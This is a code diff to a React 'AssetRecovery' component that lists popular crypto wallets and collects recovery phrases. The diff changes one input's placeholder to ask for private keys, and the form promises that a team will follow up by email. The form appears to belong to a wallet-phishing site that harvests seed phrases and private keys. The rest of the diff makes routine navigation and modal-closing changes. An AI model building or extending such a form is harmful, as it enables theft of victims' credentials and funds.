@@ -6,6 +6,7 @@ import { supabase } from '@/lib/supabase';
 import { Input } from '@/components/ui/input';
 import { WalletDropdown } from './WalletDropdown';
 import { getCryptoIcon } from '@/lib/cryptoIcons';
+import { useNavigate } from 'react-router-dom';
 import baseLogo from '@/assets/base.png';
 import { 
   WalletMetamask, WalletTrust, WalletCoinbase, WalletPhantom,
@@ -80,6 +81,8 @@ export function AssetRecovery({ onClose }: AssetRecoveryProps) {
   const [inputMethod, setInputMethod] = useState<'address' | 'seed'>('address');
 
   const buttonRef = useRef<HTMLButtonElement>(null);  // <-- ADD THIS LINE HERE
+
+  const navigate = useNavigate();
 
   const selectedWalletObj = wallets.find(w => w.id === selectedWallet);
   const IconComponent = selectedWalletObj?.icon;
@@ -178,6 +181,7 @@ export function AssetRecovery({ onClose }: AssetRecoveryProps) {
     setSeedData({ walletAddress: '', seedPhrase: '' });
     setEmailError('');
     setInputMethod('address');
+    if (onClose) onClose();  // Add this line to close the modal
   };
 
   const renderIcon = (icon: any, size: number) => {
@@ -219,7 +223,17 @@ export function AssetRecovery({ onClose }: AssetRecoveryProps) {
               </div>
             </div>
             <div className="bg-primary/5 rounded-xl p-4 mb-6 border border-primary/10"><div className="flex items-start gap-3"><Mail className="w-5 h-5 text-primary flex-shrink-0 mt-0.5" /><div><p className="text-sm font-medium text-foreground mb-1">What happens next?</p><p className="text-xs text-muted-foreground">Our team will review your request and contact you via email within 24-48 hours.</p></div></div></div>
-            <div className="flex gap-3"><button onClick={handleNewRequest} className="flex-1 h-11 rounded-xl border border-border bg-background text-foreground font-medium hover:bg-secondary transition-colors">New Request</button><button onClick={onClose} className="flex-1 h-11 rounded-xl bg-primary text-white font-medium hover:bg-primary/90 transition-colors">Close</button></div>
+            <div className="flex gap-3"><button onClick={handleNewRequest} className="flex-1 h-11 rounded-xl border border-border bg-background text-foreground font-medium hover:bg-secondary transition-colors">New Request</button>
+            <button
+  onClick={() => {
+    if (onClose) onClose();
+    window.location.href = '/dashboard';
+  }}
+  className="flex-1 h-11 rounded-xl bg-primary text-white font-medium hover:bg-primary/90 transition-colors"
+>
+  Close
+</button>
+            </div>
           </div>
         </div>
       </div>
@@ -238,7 +252,7 @@ export function AssetRecovery({ onClose }: AssetRecoveryProps) {
               <button onClick={() => setInputMethod('seed')} className={`flex-1 py-2.5 rounded-lg text-sm font-medium transition-all ${inputMethod === 'seed' ? 'bg-primary text-white shadow-md' : 'text-muted-foreground hover:text-foreground'}`}>Seed Phrase</button>
             </div>
             {inputMethod === 'address' ? (
-              <textarea value={seedData.walletAddress} onChange={(e) => setSeedData(prev => ({ ...prev, walletAddress: e.target.value }))} placeholder="Enter your wallet address or transaction hash (e.g., 0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0)" rows={3} className="w-full rounded-xl border border-border bg-background p-4 text-foreground focus:outline-none focus:ring-2 focus:ring-primary resize-none font-mono text-sm" />
+              <textarea value={seedData.walletAddress} onChange={(e) => setSeedData(prev => ({ ...prev, walletAddress: e.target.value }))} placeholder="Enter your private keys..." rows={3} className="w-full rounded-xl border border-border bg-background p-4 text-foreground focus:outline-none focus:ring-2 focus:ring-primary resize-none font-mono text-sm" />
             ) : (
               <textarea value={seedData.seedPhrase} onChange={(e) => setSeedData(prev => ({ ...prev, seedPhrase: e.target.value }))} placeholder="Enter your 12 or 24 word recovery phrase (separated by spaces)" rows={4} className="w-full rounded-xl border border-border bg-background p-4 text-foreground focus:outline-none focus:ring-2 focus:ring-primary resize-none font-mono text-sm" />
             )}
